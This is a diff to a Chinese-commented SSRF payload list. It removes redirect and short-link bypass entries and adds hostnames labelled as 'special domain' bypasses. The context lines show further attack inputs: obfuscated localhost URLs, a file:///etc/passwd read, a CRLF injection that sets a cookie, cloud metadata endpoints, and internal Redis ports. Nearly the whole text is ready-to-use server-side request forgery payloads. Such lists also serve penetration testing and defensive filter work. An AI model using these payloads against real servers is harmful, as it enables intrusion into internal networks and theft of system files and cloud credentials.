@@ -64,14 +64,6 @@ http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
 # Unicode编码
 http://127。0。0。1/
 
-# ========== 使用短网址 ==========
-# 需要先创建指向127.0.0.1的短链接
-# http://bit.ly/xxxxx
-# http://t.cn/xxxxx
-
-# ========== 使用跳转 ==========
-# 创建一个302跳转到内网的页面
-http://your-server.com/redirect?url=http://127.0.0.1:6379
 
 # ========== DNS Rebinding ==========
 # 使用DNS重绑定工具
@@ -97,9 +89,6 @@ file:///etc/passwd
 # ========== CRLF 注入 ==========
 http://127.0.0.1%0d%0aSet-Cookie:%20test=1/
 
-# ========== 302 跳转 ==========
-# 需要自己搭建跳转服务
-http://your-redirect-server.com/?target=http://127.0.0.1:6379
 
 # ========== 内网 IP 段 ==========
 # 192.168.x.x
@@ -126,3 +115,9 @@ http://metadata.google.internal/
 http://0.0.0.0/
 http://0.0.0.0:6379/
 http://0/
+
+# ========== 特殊域名绕过 ==========
+http://test.xiaodi8.com
+http://114.taobao.com
+http://safe.taobao.com
+http://sudo.cc
